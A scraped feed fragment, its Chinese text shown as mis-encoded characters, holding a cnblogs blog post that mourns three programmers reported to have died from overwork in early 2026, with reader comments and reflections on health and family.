aria2c -x 8\n</code></pre>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-30 21:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/RunfarAI\">RunfarAI</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">30</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "çˆ†äº†ï¼å…³äº2026å¼€å¹´3ä½ç¨‹åºå‘˜æ¥è¿çŒæ­»äº‹ä»¶å¯¹æ™®é€šäººçš„å¯ç¤ºå½•ä¸€",
      "link": "https://www.cnblogs.com/philry/p/19540878",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/philry/p/19540878\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-30 19:11\">\n    <span>çˆ†äº†ï¼å…³äº2026å¼€å¹´3ä½ç¨‹åºå‘˜æ¥è¿çŒæ­»äº‹ä»¶å¯¹æ™®é€šäººçš„å¯ç¤ºå½•ä¸€</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h1 class=\"md-end-block md-heading md-focus\"><span class=\"md-plain md-expand\">çˆ†äº†ï¼å…³äº2026å¼€å¹´3ä½ç¨‹åºå‘˜æ¥è¿çŒæ­»äº‹ä»¶å¯¹æ™®é€šäººçš„å¯ç¤ºå½•ä¸€</span></h1>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\"><img alt=\"ç”Ÿæˆå¾®ä¿¡å…¬ä¼—å·å°é¢\" class=\"lazyload\" height=\"289\" width=\"563\" /></span></h3>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">çˆ†äº†ï¼ï¼ï¼</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">æ­¤å‰ï¼Œæˆ‘å‘å¸ƒçš„é‚£ç¯‡ã€Šç ´é˜²äº†ï¼2026å¼€å¹´3ä½ç¨‹åºå‘˜æ¥è¿çŒæ­»ï¼Œæœ€å¹´è½»26å²ï¼Œ29å²ç”·ä¸»ç¦»ä¸–æ—¶ï¼Œå¦»å­æ­£æ€€äºŒèƒ7ä¸ªæœˆâ€¦ã€‹ï¼Œæ„å¤–å¼•çˆ†äº†å…¨ç½‘å…±é¸£ï¼Œè¯„è®ºåŒºæˆäº†è¯¸å­ç™¾å®¶äº‰é¸£ç°åœºï¼Œå¤§å®¶çº·çº·åœ¨è¯„è®ºåŒºè¡¨è¾¾è‡ªå·±çš„è§‚ç‚¹ã€çœ‹æ³•å’Œåæ€ã€‚</span></p>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">åå°å‡ ç™¾æ¡ç•™è¨€ã€è¯„è®ºåŒºä¸Šåƒæ¡çƒ­è®®ï¼Œåƒæ½®æ°´ä¸€æ ·æ¶Œæ¥ï¼Œæœ‰æ¿€çƒˆçš„äº‰æ‰§ï¼Œæœ‰æ— å…³çš„è°ƒä¾ƒï¼Œä¹Ÿæœ‰å¯†å¯†éº»éº»çš„å¿ƒç–¼ã€æ„ŸåŒèº«å—çš„æ— å¥ˆï¼Œè¿˜æœ‰è—åœ¨å­—é‡Œè¡Œé—´çš„è‡ªæˆ‘åæ€ã€‚</span></h4>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">æœ‰äººè¯´ï¼Œâ€œçœ‹ç€é‚£äº›ç»†èŠ‚ï¼Œä»¿ä½›çœ‹åˆ°äº†åŠ ç­åˆ°æ·±å¤œçš„è‡ªå·±â€ï¼›æœ‰äººè¯´ï¼Œâ€œæˆ‘ä¹Ÿæ˜¯ç¨‹åºå‘˜ï¼Œæ¯å¤©è¢«bugã€KPIè¿½ç€è·‘ï¼Œè¿å¥½å¥½åƒä¸€é¡¿é¥­ã€ç¡ä¸€è§‰éƒ½æˆäº†å¥¢æœ›â€ï¼›ä¹Ÿæœ‰äººè¯´ï¼Œâ€œåŸæ¥æˆ‘ä»¬æ‹¼å‘½åŠªåŠ›æƒ³è¦å®ˆæŠ¤çš„å®¶ï¼Œä»æ¥éƒ½ä¸éœ€è¦ç”¨ç”Ÿå‘½å»æ¢â€ã€‚è¯„è®ºåŒºå°±åƒä¸€ä¸ªåŒå¤§çš„æƒ…ç»ªå‡ºå£ï¼Œå®¹çº³ç€æ— æ•°ä¸ªåœ¨ç”Ÿæ´»é‡Œå¥‹åŠ›å¥”è·‘ã€é»˜é»˜é€æ”¯çš„æ™®é€šäººï¼Œå¤§å®¶éš”ç€å±å¹•ï¼Œè¯‰è¯´ç€è‡ªå·±çš„èŒåœºå›°å¢ƒã€ç”Ÿæ´»å‹åŠ›ï¼Œä¹Ÿåœ¨è¿™ä¸‰èµ·ä»¤äººå¿ƒç¢çš„æ‚²å‰§é‡Œï¼Œçœ‹è§è‡ªå·±çš„å½±å­ï¼Œè¯»æ‡‚äº†æœ€æ²‰é‡çš„è­¦ç¤ºã€‚</span></p>\n<p class=\"md-end-block md-p md-focus\"><span class=\"md-plain\">2026å¹´ï¼Œæ‰åˆšåˆšæ‹‰å¼€åºå¹•ï¼Œå¹´å‘³è¿˜æ²¡æ¥å¾—åŠå¼¥æ¼«ï¼Œæˆ‘ä»¬å°±æ¥è¿æ”¶åˆ°äº†ä¸‰ä¸ªä»¤äººçª’æ¯çš„å™©è€—ã€‚çŸ­çŸ­äº”åå¤šå¤©é‡Œï¼Œä¸‰ä½å¹´è½»çš„ç¨‹åºå‘˜ï¼Œç›¸ç»§å€’åœ¨äº†è‡ªå·±çš„â€œæˆ˜åœºâ€ä¸Šâ€”â€”ä»–ä»¬ä¸æ˜¯å†°å†·çš„æ–°é—»æ•°å­—ï¼Œä¸æ˜¯è¢«æ‹¿æ¥è®¨è®ºçš„è¯é¢˜ï¼Œæ˜¯ä¸‰ä¸ªå®¶åº­çš„é¡¶æ¢æŸ±ï¼Œæ˜¯å¹´è¿ˆçˆ¶æ¯çš„å¿ƒå¤´è‚‰ï¼Œæ˜¯å¦»å­çš„ä¾é ï¼Œæ˜¯å­©å­çš„å…¨ä¸–ç•Œã€‚ä»–ä»¬ä¸­ï¼Œæœ€å¹´è½»çš„åªæœ‰26å²ï¼Œè¿˜æ²¡æ¥å¾—åŠå¥½å¥½æ„Ÿå—é’æ˜¥çš„çƒ­çƒˆï¼Œæ²¡æ¥å¾—åŠå®ç°è‡ªå·±çš„å°æ¢¦æƒ³ï¼Œå°±åŒ†åŒ†å‘Šåˆ«äº†è¿™ä¸ªä¸–ç•Œï¼›32å²çš„é«˜å¹¿è¾‰ï¼Œä»æ¡åƒåœ¾æ¢é›¶ç”¨é’±çš„å°‘å¹´ï¼Œæ‹¼å°½å…¨åŠ›è€ƒä¸Šå¤§å­¦ã€æ‰“æ‹¼äº‹ä¸šï¼Œæ™‹å‡ä¸ºéƒ¨é—¨ç»ç†ï¼Œæ‰‹é‡Œæ¡ç€â€œç¼–ç¨‹é©¬æ‹‰æ¾â€çš„å¥–ç‰Œï¼Œå¿ƒé‡Œè£…ç€å¯¹å®¶åº­çš„è´£ä»»ï¼Œå´åœ¨ä¸€ä¸ªæ™®é€šçš„å‘¨æœ«ï¼Œå› ä¸ºé•¿æœŸé«˜å¼ºåº¦åŠ ç­ï¼Œæ°¸è¿œåœ°åœåœ¨äº†æŠ¢æ•‘å®¤é‡Œï¼›è€Œ29å²çš„å­™æŸï¼Œç¦»ä¸–æ—¶ï¼Œå¦»å­æ­£æ€€ç€7ä¸ªæœˆçš„äºŒèƒï¼Œå®¶é‡Œè¿˜æœ‰äº”å²çš„å¥³å„¿å’Œä½“å¼±å¤šç—…ã€é ä½ä¿åº¦æ—¥çš„è€çˆ¶äº²ï¼Œä»–æ‹¼å°½å…¨åŠ›æƒ³ç»™å®¶äººæ›´å¥½çš„ç”Ÿæ´»ï¼Œå´æ²¡æƒ³åˆ°ï¼Œè‡ªå·±çš„çªç„¶ç¦»å»ï¼Œç»™è¿™ä¸ªæœ¬å°±ä¸å¯Œè£•çš„å®¶ï¼Œåˆ¤äº†â€œæ­»åˆ‘â€ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">æˆ‘è‡³ä»Šè®°å¾—ï¼Œé«˜å¹¿è¾‰ç¦»ä¸–é‚£å¤©çš„ç»†èŠ‚ï¼Œæ¯æƒ³ä¸€æ¬¡ï¼Œéƒ½å¿ä¸ä½çº¢äº†çœ¼çœ¶ã€‚é‚£æ˜¯ä¸€ä¸ªå‘¨å…­ï¼Œæœ¬è¯¥æ˜¯ä¼‘æ¯çš„æ—¥å­ï¼Œå¯ä»–çš„æ—¥ç¨‹è¡¨ä¸Šï¼Œè¿˜æœ‰å››é¡¹å·¥ä½œä»»åŠ¡è¦åœ¨å½“å¤©å®Œæˆã€‚æ¸…æ™¨ï¼Œä»–èµ·åºŠåå°±è§‰å¾—èº«ä½“ä¸èˆ’æœï¼Œå´è¿˜æ˜¯å¼ºæ’‘ç€ï¼Œè·Ÿå¦»å­è¯´â€œåä¸€ä¼šå„¿ï¼Œé¡ºä¾¿å¤„ç†ä¸‹å·¥ä½œâ€ï¼Œç”šè‡³åœ¨å¦»å­æå‡ºå¸¦ä»–å»åŒ»é™¢æ—¶ï¼Œä»–è¿˜æƒ³ç€â€œåº”è¯¥ä¸ä¸¥é‡ï¼Œä½å‡ å¤©é™¢å°±å¥½ï¼ŒæŠŠç”µè„‘å¸¦ä¸Šå§â€â€”â€”ä»–åˆ°æœ€åä¸€åˆ»ï¼Œéƒ½æ²¡æœ‰æ”¾ä¸‹æ‰‹é‡Œçš„å·¥ä½œï¼Œæ²¡æœ‰æƒ³è¿‡ï¼Œè‡ªå·±çš„èº«ä½“ï¼Œæ—©å·²è¢«æ—¥å¤ä¸€æ—¥çš„ç†¬å¤œã€æ— ä¼‘æ­¢çš„åŠ ç­ï¼Œé€æ”¯åˆ°äº†æé™ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">ç”µæ¢¯é‡Œï¼Œä»–çªç„¶æ™•å€’æŠ½æï¼Œå¦»å­æ‹¼å°½å…¨åŠ›æŠŠä»–æ‹–åˆ°ç”µæ¢¯å¤–ï¼Œé‚»å±…ä»¬æ¥åŠ›åšå¿ƒè‚ºå¤è‹ï¼Œç›´åˆ°æ•‘æŠ¤è½¦èµ¶æ¥ï¼Œå¯è¿™ä¸€åˆ‡ï¼Œéƒ½æ²¡èƒ½ç•™ä½ä»–çš„ç”Ÿå‘½ã€‚ä»æ—©ä¸Š8ç‚¹58åˆ†æ‹¨æ‰“120ï¼Œåˆ°ä¸‹åˆ1ç‚¹å®£å‘Šä¸´åºŠæ­»äº¡ï¼ŒçŸ­çŸ­å››ä¸ªå¤šå°æ—¶ï¼Œä¸€ä¸ªé²œæ´»çš„äººï¼Œå°±æ°¸è¿œåœ°ç¦»å¼€äº†ã€‚æ›´ä»¤äººå¿ƒç–¼çš„æ˜¯ï¼Œåœ¨ä»–è¢«æŠ¢æ•‘çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜è¢«è«åæ‹‰å…¥äº†ä¸€ä¸ªå·¥ä½œç¾¤ï¼›åœ¨ä»–ç¦»ä¸–å…«ä¸ªå°æ—¶åï¼Œè¿˜æœ‰ä¸çŸ¥æƒ…çš„åŒäº‹å‘æ¥æ¶ˆæ¯ï¼Œæ‹œæ‰˜ä»–â€œå‘¨ä¸€ä¸€æ—©æœ‰æ€¥ä»»åŠ¡ï¼Œä»Šå¤©éªŒè´§ä¸è¿‡ï¼Œè¦æŠŠè¿™ä¸ªæ”¹ä¸‹â€ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">æ²¡æœ‰äººçŸ¥é“ï¼Œä»–å€’ä¸‹çš„é‚£ä¸€åˆ»ï¼Œå¿ƒé‡Œåœ¨æƒ³ä»€ä¹ˆã€‚æ˜¯è¿˜æ²¡å®Œæˆçš„å·¥ä½œï¼Ÿæ˜¯è¿˜æ²¡æ¥å¾—åŠé™ªä¼´çš„å¦»å­ï¼Ÿè¿˜æ˜¯é‚£ä¸ªä»–ä¸€ç›´æƒ³å¥½å¥½å­é¡ºçš„çˆ¶æ¯ï¼Ÿä»–æ›¾åœ¨16å²çš„æ—¥è®°é‡Œå†™ä¸‹â€œå‘½è¿å’ŒæŒ«æŠ˜è®©æˆ‘æ…¢æ…¢æˆé•¿ï¼Œè¦åŠªåŠ›ï¼ŒåŠªåŠ›å†åŠªåŠ›â€ï¼Œä»–åšåˆ°äº†ï¼ŒåŠªåŠ›æ‰“æ‹¼ï¼ŒåŠªåŠ›æ‰¿æ‹…ï¼Œå´å”¯ç‹¬å¿˜äº†ï¼ŒåŠªåŠ›çš„å‰æï¼Œæ˜¯æ´»ç€ã€‚ä»–çš„å¦»å­è¯´ï¼Œå‡ ä¹æ¯å¤©æ™šä¸Šï¼Œå¥¹éƒ½ä¼šå‚¬ä»–å›å®¶ï¼Œä»æ™šä¸Šä¹ç‚¹ç­‰åˆ°å‡Œæ™¨ï¼Œä»æ»¡å¿ƒæœŸå¾…ç­‰åˆ°æ»¡å¿ƒç‰µæŒ‚ï¼Œé‚£äº›â€œé©¬ä¸Šå›å®¶ï¼Œé£å¥”è€Œæ¥â€çš„æ‰¿è¯ºï¼Œé‚£äº›â€œè§£å®Œè¿™ä¸ªbugå°±å›â€çš„æ•·è¡ï¼Œåˆ°æœ€åï¼Œéƒ½å˜æˆäº†å†ä¹Ÿæ— æ³•å®ç°çš„é—æ†¾ã€‚ä»–å·¥ä½ä¸Šçš„ä¸‰å—å±å¹•ã€å©šçº±ç…§ã€è£èª‰è¯ä¹¦ï¼Œè¿˜æœ‰é‚£å¼ ç”¨æ¥åˆä¼‘çš„è¡Œå†›åºŠï¼Œéƒ½è¿˜åœ¨ï¼Œå¯é‚£ä¸ªåŠªåŠ›ä¸Šè¿›ã€è§ä¹‰å‹‡ä¸ºçš„ç”·äººï¼Œå†ä¹Ÿä¸ä¼šå›æ¥äº†ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">è€Œ29å²çš„å­™æŸï¼Œä»–çš„æ•…äº‹ï¼Œæ›´æ˜¯è®©æ— æ•°äººç ´é˜²ã€‚ä»–æ—©å¹´ä¸§æ¯ï¼Œæ˜¯çˆ¶äº²å’Œå§å§å«è¾›èŒ¹è‹¦æŠŠä»–æŠšå…»æˆäººï¼Œå¥½ä¸å®¹æ˜“è€ƒä¸Šå¤§å­¦ï¼Œè¿œèµ´æ·±åœ³æ‰“æ‹¼ï¼Œç»„å»ºäº†è‡ªå·±çš„å°å®¶ï¼Œæœ‰äº†å¯çˆ±çš„å¥³å„¿ï¼Œå¦»å­åˆæ€€ä¸Šäº†äºŒèƒï¼Œæœ¬ä»¥ä¸ºæ—¥å­ä¼šè¶Šæ¥è¶Šå¥½ï¼Œå¯å‘½è¿å´ç»™äº†ä»–æœ€æ®‹å¿çš„ä¸€å‡»ã€‚äº‹å‘å‰ä¸€æ®µæ—¶é—´ï¼Œå› ä¸ºé¡¹ç›®ç´§æ€¥ï¼Œä»–é¢‘ç¹åŠ ç­åˆ°æ·±å¤œï¼Œäº‹å‘å½“å¤©ä¸­åˆï¼Œè¿ä¸€å£å®‰ç¨³é¥­éƒ½æ²¡åƒï¼Œæ™šä¸Šå…«ç‚¹å¤šæ‰æ‹–ç€ç–²æƒ«çš„èº«èº¯å›å®¶ï¼Œå¯å³ä¾¿å›åˆ°å®¶ï¼Œå·¥ä½œä¹Ÿæ²¡æœ‰åœæ­¢ã€‚ä»–èº«ä½“æ—©å·²å‘å‡ºäº†é¢„è­¦ï¼Œå´è¿˜æ˜¯å¼ºæ’‘ç€å¤„ç†å·¥ä½œï¼Œç›´åˆ°æ·±å¤œåä¸€ç‚¹åŠï¼Œæ¯«æ— å¾å…†åœ°å€’åœ¨äº†æ´—æ‰‹é—´é‡Œï¼Œç”šè‡³å‡ºç°äº†å°¿å¤±ç¦çš„ç—‡çŠ¶â€”â€”é‚£ä¸€åˆ»ï¼Œä»–è¯¥æœ‰å¤šç—›è‹¦ï¼Œæœ‰å¤šä¸ç”˜ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">ä»–èµ°åï¼Œç•™ä¸‹çš„æ˜¯ä¸€ä¸ªæ”¯ç¦»ç ´ç¢çš„å®¶ã€‚æ€€å­•ä¸ƒä¸ªæœˆçš„å¦»å­ï¼ŒæŒºç€å¤§è‚šå­ï¼Œæ—¢è¦æ‰¿å—ä¸§å¤«ä¹‹ç—›ï¼Œåˆè¦æ‹…å¿ƒæœªæ¥çš„ç”Ÿè®¡ï¼Œè¿˜è¦ç…§é¡¾å¹´å¹¼çš„å¥³å„¿å’Œå¹´è¿ˆçš„å…¬å…¬ï¼›äº”å²çš„å¥³å„¿ï¼Œè¿˜ä¸æ‡‚â€œæ­»äº¡â€æ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ–è®¸æ¯å¤©è¿˜åœ¨é—¨å£ç­‰ç€çˆ¸çˆ¸å›å®¶ï¼Œå–Šä¸€å£°â€œçˆ¸çˆ¸â€ï¼›å¹´è¿ˆçš„è€çˆ¶äº²ï¼Œä½“å¼±å¤šç—…ï¼Œå¤±å»äº†å”¯ä¸€çš„ä¾é ï¼Œå¾€åçš„æ—¥å­ï¼Œåªèƒ½åœ¨æ€å¿µå’Œçª˜è¿«ä¸­åº¦è¿‡ã€‚è¿™ä¸ªå®¶ï¼Œæ²¡æœ‰å­˜æ¬¾ï¼Œåªæœ‰ä¸€è¾†äºŒæ‰‹çš„å¥‡ç‘è½¿è½¦ï¼Œæ˜¯ä»–ä»¬å”¯ä¸€çš„èµ„äº§ï¼Œè€Œä»–æ‹¼å‘½åŠ ç­æ¢æ¥çš„æ”¶å…¥ï¼Œä»æ¥éƒ½æ²¡æœ‰çœŸæ­£æ’‘èµ·è¿™ä¸ªå®¶ï¼Œåè€Œè®©è¿™ä¸ªå®¶ï¼Œå½»åº•é™·å…¥äº†ç»å¢ƒã€‚è¿™ä»½ç»æœ›ä¸æ— å¥ˆï¼Œä¹Ÿæˆ³ä¸­äº†å…¨ç½‘æ— æ•°æ™®é€šäººçš„å¿ƒå£°ï¼Œè¯„è®ºåŒºé‡Œï¼Œå¤ªå¤šå’Œä»–ä»¬ä¸€æ ·åœ¨ç”Ÿæ´»é‡Œè´Ÿé‡å‰è¡Œçš„äººï¼Œçº·çº·å†™ä¸‹äº†è‡ªå·±çš„æŒ£æ‰ï¼Œæ¯ä¸€æ¡ç•™è¨€ï¼Œéƒ½è—ç€ä¸ä¸ºäººçŸ¥çš„ç–²æƒ«ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">æœ‰ç¨‹åºå‘˜ç•™è¨€è¯´ï¼Œâ€œæˆ‘ä»¬æ¯å¤©æ—©ä¸Šå…«ç‚¹ä¸Šç­ï¼Œæ™šä¸Šåç‚¹ã€åä¸€ç‚¹ä¸‹ç­ï¼Œç”šè‡³å‡Œæ™¨ä¸€ä¸¤ç‚¹æ‰èƒ½å›å®¶ï¼Œä¸€å‘¨å·¥ä½œå…­å¤©ï¼Œå¶å°”å‘¨æ—¥è¿˜è¦åŠ ç­ï¼Œå¤–å–å‡‰äº†åˆçƒ­ã€çƒ­äº†åˆå‡‰æ˜¯å¸¸æ€ï¼Œä¹…åä¸åŠ¨çš„è…°è…¹ã€ç†¬çº¢çš„åŒçœ¼ã€è¶Šæ¥è¶Šç§ƒçš„å¤´é¡¶ï¼Œè¿˜æœ‰åƒä¸€å£å°±åé…¸çš„èƒƒï¼Œå¤±çœ åˆ°å¤©äº®çš„å¤œæ™šï¼Œéƒ½æ˜¯æˆ‘ä»¬çš„æ ‡é…ã€‚æˆ‘ä»¬ä¸æ˜¯ä¸æ€•ï¼Œæ˜¯ä¸æ•¢åœâ€”â€”æ€•è¢«è£å‘˜ï¼Œæ€•èµšä¸åˆ°é’±ï¼Œæ€•ç»™ä¸äº†å®¶äººæ›´å¥½çš„ç”Ÿæ´»ï¼Œæ€•è‡ªå·±ä¸€æ—¦æ¾æ‡ˆï¼Œå°±ä¼šè¢«è¿™ä¸ªç¤¾ä¼šæ·˜æ±°ï¼Œè¿å–˜æ¯çš„èµ„æ ¼éƒ½æ²¡æœ‰â€ã€‚è¿˜æœ‰å¾ˆå¤šå…¶ä»–è¡Œä¸šçš„äººï¼Œéš”ç€å±å¹•è¯‰è¯´ç€è‡ªå·±çš„å›°å¢ƒï¼Œå­—å­—æˆ³å¿ƒï¼šâ€œæˆ‘æ˜¯åšæ–°åª’ä½“çš„ï¼Œæ¯å¤©è¢«çƒ­ç‚¹ã€é€‰é¢˜ã€æ’ç‰ˆè¿½ç€è·‘ï¼Œç†¬å¤œå†™ç¨¿ã€æ”¹ç¨¿æ˜¯å¸¸æ€ï¼Œç»å¸¸å¯¹ç€ç©ºç™½æ–‡æ¡£ååˆ°å‡Œæ™¨ï¼Œå–ç€å’–å•¡ç¡¬æ’‘ï¼Œå“ªæ€•å‘çƒ§æ„Ÿå†’ï¼Œåªè¦æ²¡å€’ä¸‹ï¼Œå°±ä¸æ•¢åœæ›´â€ï¼›â€œæˆ‘æ˜¯åšé”€å”®çš„ï¼Œä¸ºäº†ä¸šç»©ï¼Œæ¯å¤©é™ªå®¢æˆ·å–é…’ã€è·‘å¸‚åœºï¼Œä¸‰é¤ä¸å®šï¼Œèƒƒæ—©å°±åäº†ï¼Œæœ‰æ—¶å€™å¿™åˆ°ä¸€æ•´å¤©å–ä¸ä¸Šä¸€å£æ°´ï¼Œæ·±å¤œé†‰é†ºé†ºå›å®¶ï¼Œè¿æ´—æ¼±çš„åŠ›æ°”éƒ½æ²¡æœ‰ï¼Œåªèƒ½å€’å¤´å°±ç¡â€ï¼›â€œæˆ‘æ˜¯åšæ•™å¸ˆçš„ï¼Œç™½å¤©ä¸Šè¯¾ã€æ‰¹æ”¹ä½œä¸šï¼Œæ™šä¸Šè¿˜è¦å¤‡è¯¾ã€å¤„ç†å­¦ç”Ÿçš„äº‹æƒ…ï¼Œç»å¸¸ç†¬å¤œåˆ°æ·±å¤œï¼Œè¿é™ªä¼´è‡ªå·±å­©å­çš„æ—¶é—´éƒ½æ²¡æœ‰ï¼Œæœ‰æ—¶å€™å­©å­ç¡ç†Ÿäº†æ‰å›å®¶ï¼Œæƒ³æŠ±æŠ±ä»–éƒ½æ€•åµé†’ï¼Œæ˜æ˜æ˜¯é™ªåˆ«äººçš„å­©å­æˆé•¿ï¼Œå´ç¼ºå¸­äº†è‡ªå·±å­©å­çš„ç«¥å¹´â€ï¼›è¿˜æœ‰èŒåœºå¦ˆå¦ˆç•™è¨€ï¼Œâ€œä¸€è¾¹æ˜¯æ”¾ä¸ä¸‹çš„å·¥ä½œï¼Œä¸€è¾¹æ˜¯èˆä¸å¾—çš„å­©å­ï¼Œæ¯å¤©åƒä¸ªé™€èºä¸€æ ·è¿è½´è½¬ï¼ŒåŠ ç­åˆ°æ·±å¤œå›å®¶ï¼Œçœ‹ç€å­©å­ç†Ÿç¡çš„è„¸ï¼Œæ»¡å¿ƒæ„§ç–šï¼Œå¯è½¬å¤´ç¬¬äºŒå¤©ï¼Œè¿˜æ˜¯è¦å’¬ç‰™æ—©èµ·èµ¶å»ä¸Šç­ï¼Œæ€•è¢«è¯´å…¼é¡¾ä¸å¥½å®¶åº­å’Œå·¥ä½œï¼Œæ›´æ€•å¤±å»è¿™ä»½èƒ½ç»™å­©å­é®é£æŒ¡é›¨çš„æ”¶å…¥â€ã€‚è¿™äº›ç»†ç¢åˆçœŸå®çš„æ—¥å¸¸ï¼Œå’Œä¸‰ä½ç¨‹åºå‘˜çš„æ‚²å‰§é‡å åœ¨ä¸€èµ·ï¼Œè®©æˆ‘ä»¬ä¸å¾—ä¸æ‰¿è®¤ï¼šæˆ‘ä»¬éƒ½åœ¨ä»¥ä¸åŒçš„æ–¹å¼ï¼Œé€æ”¯ç€è‡ªå·±çš„å¥åº·ï¼Œè´Ÿé‡å‰è¡Œã€‚</span></p>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">æˆ‘ä»¬éƒ½ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨ç”Ÿæ´»é‡Œå¥‹åŠ›æŒ£æ‰çš„æ™®é€šäººã€‚</span></h4>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">çœ‹æƒ¯äº†è¯„è®ºåŒºé‡Œé‚£äº›æˆ³å¿ƒçš„ç•™è¨€ï¼Œå†å›æœ›ä¸‰ä½å¹´è½»ç¨‹åºå‘˜çš„æ‚²å‰§ï¼Œæ›´èƒ½è¯»æ‡‚è¿™ä»½æŒ£æ‰èƒŒåçš„å¿ƒé…¸â€”â€”æˆ‘ä»¬æ€»ä»¥ä¸ºï¼Œåªè¦æ‹¼å‘½åŠªåŠ›ï¼Œåªè¦å¤šèµšä¸€ç‚¹é’±ï¼Œå°±èƒ½å®ˆæŠ¤å¥½è‡ªå·±æƒ³å®ˆæŠ¤çš„äººï¼Œå°±èƒ½è¿‡ä¸Šè‡ªå·±æƒ³è¦çš„ç”Ÿæ´»ã€‚æˆ‘ä»¬æ€»åœ¨é€æ”¯è‡ªå·±çš„èº«ä½“ï¼Œæ€»åœ¨å®‰æ…°è‡ªå·±â€œå†æ‹¼ä¸€ä¸‹ï¼Œå†ç†¬ä¸€ä¸‹ï¼Œç­‰ä»¥åå°±å¥½äº†â€ï¼Œå´å¿˜äº†ï¼Œèº«ä½“ä»æ¥éƒ½ä¸æ˜¯é“åšçš„ï¼Œå®ƒæœ‰è‡ªå·±çš„åº•çº¿ï¼Œä¸€æ—¦çªç ´ï¼Œå°±å†ä¹Ÿæ— æ³•æŒ½å›ã€‚æˆ‘ä»¬æ‹¼å‘½è¿½æ±‚çš„è´¢å¯Œã€åœ°ä½ã€è£èª‰ï¼Œåœ¨ç”Ÿå‘½é¢å‰ï¼Œéƒ½æ˜¾å¾—é‚£ä¹ˆå¾®ä¸è¶³é“ï¼›æˆ‘ä»¬è´¹å°½å…¨åŠ›æƒ³è¦å®ˆæŠ¤çš„å®¶ï¼Œä»æ¥éƒ½ä¸éœ€è¦æˆ‘ä»¬ç”¨ç”Ÿå‘½å»æ¢â€”â€”å¯¹äºå®¶äººæ¥è¯´ï¼Œä½ å¹³å®‰å¥åº·åœ°æ´»ç€ï¼Œæ¯”ä»€ä¹ˆéƒ½é‡è¦ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">é«˜å¹¿è¾‰çš„å¦»å­è¯´ï¼Œå¦‚æœæ—¶é—´å¯ä»¥å€’æµï¼Œå¥¹ä¸€å®šåšæŒè®©ä»–è¾æ‰å·¥ä½œï¼Œå“ªæ€•èµšå¾—å°‘ä¸€ç‚¹ï¼Œå“ªæ€•æ—¥å­è¿‡å¾—è‹¦ä¸€ç‚¹ï¼Œåªè¦ä»–èƒ½å¹³å®‰å¥åº·å°±å¥½ï¼›å­™æŸçš„å¦»å­ï¼ŒæŒºç€å¤§è‚šå­ï¼Œåœ¨æ·±å¤œé‡Œé»˜é»˜æµæ³ªï¼Œå¥¹ä¸€å®šæ— æ•°æ¬¡æƒ³è¿‡ï¼Œå¦‚æœä¸ˆå¤«æ²¡æœ‰é‚£ä¹ˆæ‹¼å‘½ï¼Œå¦‚æœä¸ˆå¤«èƒ½å¥½å¥½ç…§é¡¾è‡ªå·±ï¼Œæ˜¯ä¸æ˜¯ä¸€åˆ‡éƒ½ä¼šä¸ä¸€æ ·ã€‚å¯ä¸–ä¸Šæ²¡æœ‰å¦‚æœï¼Œç”Ÿå‘½ä¹Ÿæ²¡æœ‰é‡æ¥çš„æœºä¼šï¼Œé‚£äº›å› ä¸ºé€æ”¯èº«ä½“ç•™ä¸‹çš„é—æ†¾ï¼Œé‚£äº›å› ä¸ºçªç„¶ç¦»ä¸–å¸¦æ¥çš„ä¼¤ç—›ï¼Œä¼šæ°¸è¿œåˆ»åœ¨å®¶äººçš„å¿ƒé‡Œï¼Œä¸€è¾ˆå­éƒ½æ— æ³•æ„ˆåˆã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">è¯„è®ºåŒºé‡Œï¼Œæœ‰ä¸€æ¡ç•™è¨€ï¼Œè®©æˆ‘å°è±¡æ·±åˆ»ï¼šâ€œä»¥å‰æ€»è§‰å¾—ï¼Œæ­»äº¡ç¦»æˆ‘ä»¬å¾ˆè¿œï¼Œç›´åˆ°çœ‹åˆ°è¿™ä¸‰èµ·æ‚²å‰§ï¼Œæ‰æ˜ç™½ï¼Œæ„å¤–å’Œæ˜å¤©ï¼Œä»æ¥éƒ½ä¸çŸ¥é“å“ªä¸ªä¼šå…ˆæ¥ã€‚æˆ‘ä»¬æ€»åœ¨ä¸ºäº†ç”Ÿæ´»æ‹¼å‘½ï¼Œå´å¿˜äº†ï¼Œå¥½å¥½æ´»ç€ï¼Œæ‰æ˜¯æœ€åŸºæœ¬çš„åº•æ°”â€ã€‚</span></p>\n<h4 class=\"md-end-block md-heading\"><span 